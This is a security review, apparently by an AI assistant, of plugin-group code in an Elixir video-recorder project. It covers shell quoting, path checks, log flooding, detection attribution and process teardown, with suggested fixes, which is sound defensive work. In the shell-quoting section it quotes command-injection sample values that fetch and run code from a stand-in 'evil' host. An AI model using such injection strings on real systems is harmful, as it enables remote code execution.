# Security Review: multiplexed plugin (plugin groups)

Scope: new external-process + input-handling surface —
`lib/cairn/plugin_group_port.ex`, `lib/cairn/config/plugin_group.ex`,
`plugins:` parsing in `lib/cairn/config.ex`, group-name validation.
Baseline for comparison: pre-existing per-camera `lib/cairn/plugin_port.ex`.

## Verdict

No BLOCKER. The headline concern — shell quoting of `--cameras-json` — is
**not exploitable**; see "Verified safe". Three WARNINGs, two SUGGESTIONs.

## Verified safe (checked, no action needed)

- **Shell quoting of the group argv** (`lib/cairn/ffmpeg_port.ex:161-165`,
  used at `lib/cairn/plugin_group_port.ex:204`).
  `shell_escape/1` wraps every argv element in single quotes and rewrites
  `'` as `'\''` — correct POSIX quoting. JSON double quotes, `$`, backticks,
  `;`, `&&`, newlines are all inert inside single quotes. I traced the two
  attacker-influenced substrings inside `Jason.encode!(group.members)`:
  camera `id` (already constrained to `[a-z0-9_-]` at
  `lib/cairn/config/camera.ex:46`) and `min_score` **label keys**, which are
  arbitrary operator YAML strings (`lib/cairn/config/camera.ex:91`,
  `to_string(label)` with no charset check). A label of
  `'; curl evil|sh; '` or `$(id)` is escaped correctly by `shell_escape/1`
  and reaches the plugin as literal argv. Jason also `\u`-escapes control
  characters and NUL, so nothing can terminate the C string early. No
  breakout, no escalation over the per-camera baseline.
- No `String.to_atom/1` on plugin or config input; `Cairn.Registry` keys are
  strings (`lib/cairn/registry.ex:16`), so group names cannot exhaust the
  atom table.
- No `raw/1`, no `:erlang.binary_to_term/1` anywhere in `lib/`.
- Group name cannot traverse paths: `@name_regex` (`lib/cairn/config.ex:22`)
  forces a leading `[a-z0-9]` and forbids `/` and `.`, so
  `plugin-{name}.log` stays in `{data_dir}/log`. The name-vs-camera-id
  collision check (`lib/cairn/config.ex:283-286`) correctly prevents two
  writers on the same log file.
- `min_score` thresholding uses the **server-side** camera struct from
  `routes`, not anything in the plugin's stdout
  (`lib/cairn/detection_aggregator.ex:251`) — a plugin cannot lower its own
  score floor.
- Group `command` injection from YAML is accepted-by-design (operators
  already specify argv); `PluginGroup.parse/3` adds no new escalation
  beyond that baseline.

## WARNING 1 — Stale per-camera config in a group's routes after reload

- **Location**: `lib/cairn/plugin_group_port.ex:66,116-132` +
  `lib/cairn/config/server.ex:132-144`
- **Issue**: `build_routes/2` resolves `{cam, Config.windows(config, cam)}`
  **once at init** and the module docs state membership is fixed for the
  process lifetime, relying on reload to restart the group. But
  `diff_plugin_groups/2` only restarts when the `PluginGroup` struct changes,
  and that struct carries only `command` + members `%{id, udp_port,
  min_score}`. Per-camera fields that are *not* in a member entry never
  trigger a group restart.
- **Trigger**: operator lowers `max_event_seconds: 300 -> 30` (or changes
  `pre/post_window_seconds`, `retention.days`, `retention.per_label`) on a
  camera that belongs to a group, then reloads. `diff_cameras/2` restarts
  that camera's own pipeline, and the reload reports success — but the group
  port keeps handing the aggregator the **pre-reload** `cam` struct and
  windows for as long as the plugin process survives. The tightened
  event-length / retention limit silently does not apply, so the
  disk-consumption control the operator just applied is a no-op until the
  next restart. The pre-existing `PluginPort` has no such drift:
  `camera_changed?/4` compares the whole struct *and* the resolved windows,
  so every change restarts it. This is a regression introduced by the group
  path.
- **Fix**: make the group's change detection cover everything the routes
  depend on — e.g. fold each member's resolved windows and retention into
  the member map used by `diff_plugin_groups/2`:

```elixir
# lib/cairn/config.ex, members_for/2
%{id: cam.id, udp_port: udp_port, min_score: cam.min_score,
  windows: Cairn.Config.windows(config, cam),
  retention_days: cam.retention_days,
  retention_per_label: cam.retention_per_label}
```

  (then strip the extra keys in `build_argv/1` before `Jason.encode!/1` so
  the wire contract is unchanged), or have `PluginGroupPort` rebuild
  `routes` from the new config on reload instead of only at init.

## WARNING 2 — Unthrottled logging of plugin-supplied `camera_id`

- **Location**: `lib/cairn/plugin_group_port.ex:155-158`
- **Issue**: plugin stdout is semi-trusted, and this is the only path that
  echoes plugin-controlled data into the log. Every unroutable line emits
  one `Logger.warning` carrying `inspect(camera_id)`. There is no rate
  limit, no dedupe, and no length cap of our own.
- **Trigger**: a buggy or compromised plugin (or one fed a
  `--cameras-json` it mis-parses after a partial reload) emits ndjson with a
  wrong/garbage `camera_id` at frame rate. With N cameras multiplexed into
  one group, that is N x fps warnings per second, each up to ~4 KB of
  attacker bytes (`inspect/1`'s `:printable_limit` is 4096, so it is bounded
  per line but not per second). The log lives under `data_dir`, the same
  volume as recordings, so sustained flooding drives free space under
  `free_space_min_mb` and **recording stops**. That makes it an
  availability attack on the NVR's primary function, reachable from the
  least-trusted component in the design.
- **Not** a log-injection: `inspect/1` escapes newlines and control bytes,
  so no forged log lines or ANSI.
- **Fix**: truncate and throttle, e.g.

```elixir
:error ->
  id = camera_id |> inspect() |> String.slice(0, 64)
  # once per unknown id per group, or a periodic counter flush
  Logger.warning("plugin group #{state.group.name}: line for unknown camera #{id} dropped")
```

  and track seen-unknown ids in state so each is logged once.

## WARNING 3 — Plugin chooses the camera a detection is attributed to

- **Location**: `lib/cairn/plugin_group_port.ex:149-160`
- **Issue**: in the per-camera design the OS process *was* the camera
  identity; now the plugin self-declares `camera_id` on every line and that
  string selects which camera's event timeline, clip and snapshot are
  driven. `Map.fetch(state.routes, camera_id)` correctly bounds this to
  members of the same group (a group-A plugin cannot touch a group-B or
  ungrouped camera), which is the right boundary — but inside the group the
  attribution is entirely plugin-asserted.
- **Trigger**: a compromised or confused plugin binary can fabricate
  detections for a member camera it is not actually decoding (spurious
  events, clips, HA notifications) or attribute a real detection to the
  wrong camera, hiding an event on the camera that actually saw it.
- **Fix**: no code change strictly required — this is inherent to
  multiplexing — but the shared failure/trust domain should be explicit in
  `docs/plugin-contract.md` and in the `@moduledoc`: "a group's plugin is
  trusted for detection attribution across all its members; do not group
  cameras with different trust or alerting sensitivity."

## SUGGESTION 1 — `@name_regex` accepts a trailing newline

- **Location**: `lib/cairn/config.ex:22` (used at `lib/cairn/config.ex:282`)
- `~r/^[a-z0-9][a-z0-9_-]*$/` — in PCRE, `$` also matches immediately
  before a final newline, so a YAML plugin key of `"detect\n"` passes
  validation and produces the log path `plugin-detect\n.log`. Not path
  traversal (the leading class blocks `.` and `/`), but it creates a
  newline-bearing filename that is awkward for log shipping and near-
  indistinguishable from the legitimate `plugin-detect.log` in tooling.
- **Fix**: `~r/\A[a-z0-9][a-z0-9_-]*\z/`.

## SUGGESTION 2 — SIGTERM-only teardown, now with N-camera blast radius

- **Location**: `lib/cairn/plugin_group_port.ex:219-231`
- `kill_port/1` shells out to `kill -TERM`, never waits, and never
  escalates to `SIGKILL`. A plugin that ignores SIGTERM (or is wedged in a
  GPU driver call) keeps its bound UDP sockets; the group is then restarted
  by `apply_diff/2` and the fresh process cannot bind, so it backs off to
  30 s forever. In the per-camera design that silently disabled detection
  for one camera; a group now disables detection for **every member** —
  fail-open, with no alert beyond a repeated "exited with status" warning.
- **Fix**: after `Port.close/1`, `Process.send_after` a `:sigkill` check on
  `state.os_pid`, and surface repeated respawn failures (a status/health
  field) rather than only logging.

## Pre-existing (baseline, not introduced here)

- `lib/cairn/config/camera.ex:46` — same `^...$` trailing-newline quirk on
  camera `id`, which feeds `ffmpeg-{id}.log` / `plugin-{id}.log`.
- `lib/cairn/plugin_port.ex:119,122` — one unthrottled warning per malformed
  plugin line (no attacker data, so log-volume only).
- `lib/cairn/plugin_group_port.ex:164-167` (mirrors
  `lib/cairn/plugin_port.ex:128-131`) — `bbox` validated as `is_list/1`
  only; arity and element types are never checked before the value is
  stored and served.
- `lib/cairn/detection_aggregator.ex:262,273` — plugin-supplied `label` is
  stored with an unrestricted charset (count is capped at 5 000 entries).
- `lib/cairn/plugin_group_port.ex:211-217` — backoff never resets after a
  long healthy run, so a group that flapped once stays at the 30 s ceiling.

## Tools for the user to run (no Bash access here)

- `mix sobelow --exit medium`
- `mix deps.audit`
- `mix hex.audit`
